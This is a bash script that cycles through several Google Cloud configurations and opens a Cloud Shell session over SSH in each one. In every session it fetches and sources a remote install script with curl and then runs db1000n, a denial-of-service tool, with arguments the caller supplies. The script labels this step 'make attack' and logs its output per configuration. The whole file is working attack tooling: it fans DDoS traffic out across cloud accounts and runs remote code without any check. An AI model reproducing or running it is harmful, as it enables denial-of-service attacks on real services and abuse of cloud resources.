#!/bin/bash

# set gcloud path
gcloud=${GCLOUD_HOME:-gcloud}

# get first argument as number of first gshell
first_shell_num=${1:-0}

# get first argument as number of second gshell
second_shell_num=${2:-3}

# get third argument as db1000n arguments
needles_args=${3:-''}

# make gcloud configurations
gcloud_configs=()
IFS=$'\n' configs_out=($($gcloud config configurations list))

no_configs=('NAME' 'default')
for index in "${!configs_out[@]}"
  do
      IFS=$' ' config_details=(${configs_out[index]})
      config=${config_details[0]}
      if [[ ! ${no_configs[*]} =~ $config ]]
        then
          gcloud_configs=("${gcloud_configs[@]}" "$config")
      fi
  done

if ((${#gcloud_configs[@]}))
  then
    printf '\n gcloud configurations: %s\n' "${gcloud_configs[*]}"
  else
    printf '\n there is no gcloud configuration\n'
fi

# create logs directory
mkdir -p logs

# make attack
for ((index=first_shell_num; index<=second_shell_num; index++))
  do
    printf '\n gcloud configuration %s: attack started\n' "${gcloud_configs[index]}"
    attack_command=$(CLOUDSDK_ACTIVE_CONFIG_NAME="${gcloud_configs[index]}" \
                     "${gcloud}" cloud-shell ssh --authorize-session \
                     --command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) \
                     && ./db1000n ${needles_args}" \
                     > logs/configuration_"${gcloud_configs[index]}".log &)

    printf 'attack finished: %s' "$attack_command"
  done






